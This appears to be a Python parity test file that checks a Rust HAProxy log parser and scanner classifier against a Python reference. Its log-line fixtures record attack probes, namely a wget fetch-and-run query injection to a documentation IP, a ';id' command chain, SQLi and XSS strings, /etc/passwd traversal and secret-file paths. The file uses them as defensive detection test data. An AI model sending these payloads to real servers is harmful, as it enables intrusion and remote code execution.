"""Differential parity tests: Rust `guardd-core` vs Python `easy-ha-proxy-guardd`.

Verifies that the zero-regex Rust parser, Aho-Corasick User-Agent classifier,
path/query/observation classifiers, and C-ABI batch bridge produce field-for-field
identical results to the Python reference implementation across real HAProxy
access-log fixtures and adversarial edge cases.
"""

from __future__ import annotations

import ctypes
import importlib.util
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[1]
FILES = ROOT / "ansible" / "roles" / "haproxy-admin" / "files"
SIGNATURES_PATH = FILES / "scanner-signatures.json"


def _load_python_guardd():
    name = "guardd_parity_ref"
    if name in sys.modules:
        return sys.modules[name]
    spec = importlib.util.spec_from_file_location(name, FILES / "easy-ha-proxy-guardd.py")
    assert spec and spec.loader
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    mod.load_signatures(str(SIGNATURES_PATH))
    return mod


def _find_rust_bin() -> Path | None:
    env = os.environ.get("GUARDD_RUST_BIN")
    if env and Path(env).is_file():
        return Path(env)
    for candidate in (
        ROOT / "rust" / "guardd" / "target" / "release" / "guardd-core",
        ROOT / "rust" / "guardd" / "target" / "debug" / "guardd-core",
    ):
        if candidate.is_file():
            return candidate
    return None


def _find_rust_lib() -> Path | None:
    env = os.environ.get("GUARDD_RUST_LIB")
    if env and Path(env).is_file():
        return Path(env)
    for candidate in (
        ROOT / "rust" / "guardd" / "target" / "release" / "libguardd_core.so",
        ROOT / "rust" / "guardd" / "target" / "debug" / "libguardd_core.so",
    ):
        if candidate.is_file():
            return candidate
    return None


PARITY_LINES: list[str] = [
    # Standard HTTP/2 absolute-form target
    (
        "2026-08-11T06:18:05.912571+00:00 haproxy-easy haproxy[976]: "
        "192.168.50.186:2160 [11/Aug/2026:06:18:05.863] fe_https~ be_admin/ui "
        "11/0/0/30/47 200 786 ----- 1/1/0/0/0 0/0 "
        "GET https://ha.easy-ha-proxy.test/haproxy/config/state HTTP/2.0"
    ),
    # HTTP/1.1 decisive scanner path
    (
        "2026-08-11T07:26:51.104063+00:00 haproxy-easy haproxy[976]: "
        "127.0.0.1:60374 [11/Aug/2026:07:26:51.096] fe_https~ fe_https/<NOSRV> "
        "0/-1/-1/-1/6 400 58 PR--- 1/1/0/0/0 0/0 GET /.env HTTP/1.1"
    ),
    # Geo-blocked VCS probe
    (
        "2026-08-11T07:26:51.127725+00:00 haproxy-easy haproxy[976]: "
        "127.0.0.1:60378 [11/Aug/2026:07:26:51.114] fe_https~ fe_https/<NOSRV> "
        "0/-1/-1/-1/6 451 76 PR--- 1/1/0/0/0 0/0 GET /.git/config HTTP/1.1"
    ),
    # Query secret dropped from normalized path
    (
        "2026-08-11T07:26:51.147284+00:00 haproxy-easy haproxy[976]: "
        "127.0.0.1:60384 [11/Aug/2026:07:26:51.139] fe_https~ fe_https/<NOSRV> "
        "0/-1/-1/-1/7 451 76 PR--- 1/1/0/0/0 0/0 "
        "GET /reset?token=SECRET123 HTTP/1.1"
    ),
    # Non-access warning line (must return None)
    (
        "2026-08-11T06:03:01.160002+00:00 haproxy-easy haproxy[976]: "
        "[WARNING]  (976) : Server be_site2_easy_ha_proxy_test/srv1 is UP"
    ),
    # Non-access backend error line (must return None)
    (
        "2026-08-11T06:02:53.606589+00:00 haproxy-easy haproxy[976]: "
        "backend be_site2_easy_ha_proxy_test has no server available!"
    ),
    # Bad request with ban_reason and request id
    (
        "2026-08-11T07:26:51.104063+00:00 gw haproxy[10]: "
        "203.0.113.5:5000 [11/Aug/2026:07:26:51.096] fe_https~ fe_https/<NOSRV> "
        '0/-1/-1/-1/6 400 58 PR--- 1/1/0/0/0 0/0 id=req-42 ban_reason="adaptive ban" <BADREQ>'
    ),
    # IPv6 client with auth_user, host, ua
    (
        "2026-08-11T07:26:51.104063+00:00 gw haproxy[10]: "
        "[2001:db8::1]:5000 [11/Aug/2026:07:26:51.096] fe_https~ be_app/s1 "
        "0/0/1/5/12 200 1024 ----- 1/1/0/0/0 0/0 id=abc host=app.example.com "
        "ua=Mozilla/5.0 auth_user=alice%40example.com GET /api/secondfactor/webauthn/credentials HTTP/2.0"
    ),
    # Scanner tool UA + SQLi + XSS observation flags
    (
        "2026-08-11T07:26:51.104063+00:00 gw haproxy[10]: "
        "198.51.100.77:60374 [11/Aug/2026:07:26:51.096] fe_https~ be_app/s1 "
        "0/0/0/2/3 404 210 ----- 1/1/0/0/0 0/0 host=shop.example.com ua=sqlmap/1.7 "
        "GET /search?q=1%27+UNION+SELECT+1--&x=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1"
    ),
    # Fetch-and-run query injection
    (
        "2026-08-11T07:26:51.104063+00:00 gw haproxy[10]: "
        "198.51.100.88:60374 [11/Aug/2026:07:26:51.096] fe_https~ be_app/s1 "
        "0/0/0/2/3 404 210 ----- 1/1/0/0/0 0/0 host=shop.example.com ua=- "
        "GET /setup.cgi?cmd=wget+http://198.51.100.1/x.sh HTTP/1.1"
    ),
    # Shell-chaining query injection
    (
        "2026-08-11T07:26:51.104063+00:00 gw haproxy[10]: "
        "198.51.100.89:60374 [11/Aug/2026:07:26:51.096] fe_https~ be_app/s1 "
        "0/0/0/2/3 404 210 ----- 1/1/0/0/0 0/0 host=- ua=ZGrab/0.x "
        "GET /device.rsp?opt=;id HTTP/1.1"
    ),
    # Double-encoded sensitive path + service API probe
    (
        "2026-08-11T07:26:51.104063+00:00 gw haproxy[10]: "
        "198.51.100.90:60374 [11/Aug/2026:07:26:51.096] fe_https~ be_app/s1 "
        "0/0/0/2/3 404 210 ----- 1/1/0/0/0 0/0 host=shop.example.com "
        "GET /%252eenv HTTP/1.1"
    ),
    (
        "2026-08-11T07:26:51.104063+00:00 gw haproxy[10]: "
        "198.51.100.91:60374 [11/Aug/2026:07:26:51.096] fe_https~ be_app/s1 "
        "0/0/0/2/3 404 210 ----- 1/1/0/0/0 0/0 host=shop.example.com "
        "GET /v1.41/containers/json HTTP/1.1"
    ),
    # Raw path traversal before canonicalization
    (
        "2026-08-11T07:26:51.104063+00:00 gw haproxy[10]: "
        "198.51.100.92:60374 [11/Aug/2026:07:26:51.096] fe_https~ be_app/s1 "
        "0/0/0/2/3 404 210 ----- 1/1/0/0/0 0/0 host=shop.example.com "
        "GET /a/b/../../../etc/passwd HTTP/1.1"
    ),
    # HTTP/1.0 + modern Chrome UA + dash status/bytes
    (
        "2026-08-11T07:26:51.104063+00:00 gw haproxy[10]: "
        "198.51.100.93:60374 [11/Aug/2026:07:26:51.096] fe_https~ be_app/s1 "
        "0/0/0/-1/5 - - CD--- 1/1/0/0/0 0/0 host=shop.example.com "
        "ua=Mozilla/5.0_Chrome/124.0.0.0_Safari/537.36 "
        "PROPFIND /wp-admin/install.php HTTP/1.0"
    ),
    # Asset under probable scanner segment (must suppress probable category)
    (
        "2026-08-11T07:26:51.104063+00:00 gw haproxy[10]: "
        "198.51.100.94:60374 [11/Aug/2026:07:26:51.096] fe_https~ be_app/s1 "
        "0/0/0/1/2 404 120 ----- 1/1/0/0/0 0/0 host=shop.example.com "
        "GET /vendor/app/style.css HTTP/2.0"
    ),
    # Nested decisive segment under probable segment (decisive must win)
    (
        "2026-08-11T07:26:51.104063+00:00 gw haproxy[10]: "
        "198.51.100.95:60374 [11/Aug/2026:07:26:51.096] fe_https~ be_app/s1 "
        "0/0/0/1/2 404 120 ----- 1/1/0/0/0 0/0 host=shop.example.com "
        "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1"
    ),
]


def _py_parsed_dict(req) -> dict | None:
    if req is None:
        return None
    return {
        "client_ip": req.client_ip,
        "status": req.status,
        "frontend": req.frontend,
        "backend": req.backend,
        "method": req.method,
        "path": req.path,
        "host": req.host,
        "bad_request": req.bad_request,
        "query_flag": req.query_flag,
        "path_flag": req.path_flag,
        "observation_flags": list(req.observation_flags),
        "ts": req.ts,
        "request_id": req.request_id,
        "bytes_out": req.bytes_out,
        "duration_ms": req.duration_ms,
        "response_ms": req.response_ms,
        "times": req.times,
        "term": req.term,
        "ban_reason": req.ban_reason,
        "user_agent": req.user_agent,
        "authenticated_user": req.authenticated_user,
        "protocol": req.protocol,
    }


class RustGuarddParityTests(unittest.TestCase):
    def test_cli_parse_matches_python_field_for_field(self) -> None:
        rust_bin = _find_rust_bin()
        if rust_bin is None:
            self.skipTest("Rust guardd-core binary not built")
        py = _load_python_guardd()
        proc = subprocess.run(
            [str(rust_bin), "parse", "--signatures", str(SIGNATURES_PATH)],
            input="\n".join(PARITY_LINES) + "\n",
            text=True,
            capture_output=True,
            check=True,
        )
        rust_rows = [json.loads(line) for line in proc.stdout.splitlines() if line.strip()]
        self.assertEqual(len(rust_rows), len(PARITY_LINES))

        for idx, (raw, rust_row) in enumerate(zip(PARITY_LINES, rust_rows, strict=True)):
            with self.subTest(index=idx, line=raw[:80]):
                py_req = py.parse_access_line(raw)
                self.assertEqual(rust_row["parsed"], _py_parsed_dict(py_req))
                if py_req is not None:
                    self.assertEqual(rust_row["path_category"], py.classify_path(py_req.path))
                    py_tok, py_cat = py.classify_user_agent(py_req.user_agent)
                    self.assertEqual(rust_row["ua_token"], py_tok)
                    self.assertEqual(rust_row["ua_category"], py_cat)

    def test_cdylib_c_abi_batch_matches_python(self) -> None:
        rust_lib = _find_rust_lib()
        if rust_lib is None:
            self.skipTest("Rust libguardd_core.so not built")
        py = _load_python_guardd()
        lib = ctypes.CDLL(str(rust_lib))
        lib.guardd_engine_new.argtypes = [ctypes.c_char_p]
        lib.guardd_engine_new.restype = ctypes.c_void_p
        lib.guardd_engine_free.argtypes = [ctypes.c_void_p]
        lib.guardd_parse_batch_json.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
        lib.guardd_parse_batch_json.restype = ctypes.c_void_p
        lib.guardd_string_free.argtypes = [ctypes.c_void_p]

        handle = lib.guardd_engine_new(str(SIGNATURES_PATH).encode("utf-8"))
        self.assertTrue(handle)
        try:
            payload = ("\n".join(PARITY_LINES)).encode("utf-8")
            raw_ptr = lib.guardd_parse_batch_json(handle, payload)
            self.assertTrue(raw_ptr)
            try:
                decoded = json.loads(ctypes.string_at(raw_ptr).decode("utf-8"))
            finally:
                lib.guardd_string_free(raw_ptr)
        finally:
            lib.guardd_engine_free(handle)

        self.assertEqual(len(decoded), len(PARITY_LINES))
        for idx, (raw, rust_parsed) in enumerate(zip(PARITY_LINES, decoded, strict=True)):
            with self.subTest(index=idx):
                self.assertEqual(rust_parsed, _py_parsed_dict(py.parse_access_line(raw)))

    def test_python_native_bridge_matches_pure_python(self) -> None:
        rust_lib = _find_rust_lib()
        if rust_lib is None:
            self.skipTest("Rust libguardd_core.so not built")
        py = _load_python_guardd()
        prev = os.environ.get("GUARDD_NATIVE_LIB")
        os.environ["GUARDD_NATIVE_LIB"] = str(rust_lib)
        py.reset_native_bridge()
        try:
            native_rows = py.parse_access_lines_native(PARITY_LINES)
            self.assertIsNotNone(native_rows)
            assert native_rows is not None
            self.assertEqual(len(native_rows), len(PARITY_LINES))
            for idx, (raw, got) in enumerate(zip(PARITY_LINES, native_rows, strict=True)):
                with self.subTest(index=idx):
                    self.assertEqual(got, py.parse_access_line(raw))
        finally:
            if prev is None:
                os.environ.pop("GUARDD_NATIVE_LIB", None)
            else:
                os.environ["GUARDD_NATIVE_LIB"] = prev
            py.reset_native_bridge()

    def test_rust_sqlite_databases_are_readable_and_scorable_by_python(self) -> None:
        rust_bin = _find_rust_bin()
        if rust_bin is None:
            self.skipTest("Rust guardd-core binary not built")
        py = _load_python_guardd()
        with tempfile.TemporaryDirectory() as tmp:
            sec_path = Path(tmp) / "security.db"
            req_path = Path(tmp) / "requests.db"
            proc = subprocess.run(
                [
                    str(rust_bin),
                    "seed-db",
                    "--security-db",
                    str(sec_path),
                    "--requests-db",
                    str(req_path),
                    "--signatures",
                    str(SIGNATURES_PATH),
                ],
                text=True,
                capture_output=True,
                check=True,
            )
            rust_score = json.loads(proc.stdout.strip())

            # Python SecurityDatabase must open the Rust-created DB cleanly and compute the exact same score.
            py_sec = py.SecurityDatabase(str(sec_path))
            self.assertEqual(py_sec.get_state("mode_override", "monitor"), "enforce")
            py_events = py_sec.events_for("198.51.100.77", since=0)
            self.assertEqual(len(py_events), 1)
            py_score = py.score_events(py_events, 1_786_429_000, py.ScoringPolicy())
            self.assertEqual(py_score["score"], rust_score["score"])
            self.assertEqual(py_score["state"], rust_score["state"])
            self.assertEqual(py_score["recommended_action"], rust_score["recommended_action"])
            self.assertEqual(py_score["events_counted"], rust_score["events_counted"])

            # Python RequestLog must open the Rust-created requests.db and find the logged row.
            cfg = py.GuardConfig(request_log_enabled=True)
            py_rlog = py.RequestLog(str(req_path), cfg)
            result = py_rlog.search(client="198.51.100.77", since=0, until=2_000_000_000)
            self.assertEqual(len(result["requests"]), 1)
            self.assertEqual(result["requests"][0]["path"], "/.env")
            self.assertEqual(result["requests"][0]["status"], 404)
            self.assertEqual(result["requests"][0]["user_agent"], "sqlmap/1.7")


if __name__ == "__main__":
    unittest.main()
